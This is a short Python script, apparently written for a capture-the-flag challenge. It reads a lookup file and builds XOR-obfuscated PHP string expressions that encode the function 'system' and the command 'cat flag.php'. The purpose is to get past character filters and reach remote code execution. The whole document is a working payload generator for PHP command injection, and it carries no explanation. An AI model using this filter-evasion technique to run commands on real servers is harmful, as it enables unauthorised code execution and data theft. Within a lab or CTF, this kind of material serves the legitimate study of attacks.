from sys import *


def action(arg):
    s1 = ""
    s2 = ""
    for i in arg:
        f = open("D:\\phpstudy_pro\\WWW\\CTF\\rce_xor.txt", "r")
        while True:
            t = f.readline()
            if t == "":
                break
            if t[0] == i:
                # print(i)
                s1 += t[2:5]
                s2 += t[6:9]
                break
        f.close()
    output = "(\"" + s1 + "\"^\"" + s2 + "\")"
    return (output)


fun = "system"
cmd = "cat flag.php"
print("function:" + action(fun))
print("cmd:" + action(cmd))
